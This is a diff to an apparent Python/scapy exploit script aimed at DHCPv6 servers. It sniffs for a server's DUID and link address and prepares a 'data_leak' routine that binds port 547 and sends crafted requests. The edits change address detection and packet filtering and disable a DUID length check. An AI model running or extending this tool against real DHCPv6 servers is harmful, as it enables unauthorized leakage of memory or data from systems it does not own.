@@ -3,7 +3,7 @@
 from base import Base
 from argparse import ArgumentParser
 from sys import exit
-from scapy.all import sendp, sniff, Ether, IPv6, UDP, DHCP6_Solicit, DHCP6OptRapidCommit, DHCP6OptOptReq
+from scapy.all import sniff, Ether, IPv6, UDP, DHCP6_Solicit, DHCP6OptRapidCommit, DHCP6OptOptReq, DHCP6_Advertise
 from scapy.all import DHCP6OptElapsedTime, DHCP6OptClientId, DHCP6OptIA_NA, DHCP6_Reply, DHCP6OptServerId
 from socket import socket, AF_INET6, SOCK_DGRAM, SOL_SOCKET, SO_RCVBUF, AF_PACKET, SOCK_RAW, inet_pton, inet_ntoa
 from random import randint
@@ -359,27 +359,16 @@ macsrc = Base.get_netiface_mac_address(current_network_interface)
 if macsrc is None:
     macsrc = "ff:ff:ff:ff:ff:ff"
 
-ipv6_first = Base.get_netiface_ipv6_address(current_network_interface, 0)
-ipv6_second = Base.get_netiface_ipv6_address(current_network_interface, 1)
+ipv6src_link = Base.get_netiface_ipv6_link_address(current_network_interface)
+ipv6src = Base.get_netiface_ipv6_glob_address(current_network_interface)
 
-ipv6src_link = ""
-ipv6src = ""
-
-if ipv6_first is None or ipv6_second is None:
-    print Base.c_error + "Please add IPv6 address to interface: " + current_network_interface
+if ipv6src is None:
+    print Base.c_error + "Please set IPv6 global address to interface: " + current_network_interface
     exit(1)
-else:
-    if ipv6_first.startswith("fe80"):
-        ipv6src_link = ipv6_first
-        ipv6src = ipv6_second
-    elif ipv6_second.startswith("fe80"):
-        ipv6src_link = ipv6_second
-        ipv6src = ipv6_first
-    else:
-        print Base.c_error + "Please set IPv6 link local address to interface: " + current_network_interface
+if ipv6src_link is None:
+    print Base.c_error + "Please set IPv6 link local address to interface: " + current_network_interface
+    exit(1)
 
-ipv6_first = None
-ipv6_second = None
 
 dhcpv6_server_duid = None
 dhcpv6_server_ipv6_link = None
@@ -520,7 +509,7 @@ def send_dhcpv6_solicit():
 
 def recv_dhcpv6_reply():
     sniff(iface=current_network_interface, stop_filter=dhcpv6_callback, count=1,
-          filter="udp and src port 547 and dst port 546")
+          lfilter=lambda d: DHCP6_Advertise in d or DHCP6_Reply in d)
 
 
 def dhcpv6_callback(pkt):
@@ -528,7 +517,7 @@ def dhcpv6_callback(pkt):
     global dhcpv6_server_ipv6_link
     global dhcpv6_server_duid
 
-    if pkt.haslayer(DHCP6_Reply):
+    if pkt.haslayer(DHCP6_Advertise) or pkt.haslayer(DHCP6_Reply):
         if pkt[DHCP6OptServerId].duid is None:
             return False
         else:
@@ -757,7 +746,7 @@ def data_leak():
     sock.bind(('::', 547))
 
     duid = unhexlify(str(dhcpv6_server_duid).encode("hex"))
-    assert len(duid) == 14
+    # assert len(duid) == 14
 
     link_addr = str(IPv6Address(unicode(ipv6src)) + randint(1, 10))
     peer_addr = ipv6r.get_random_ip(8)
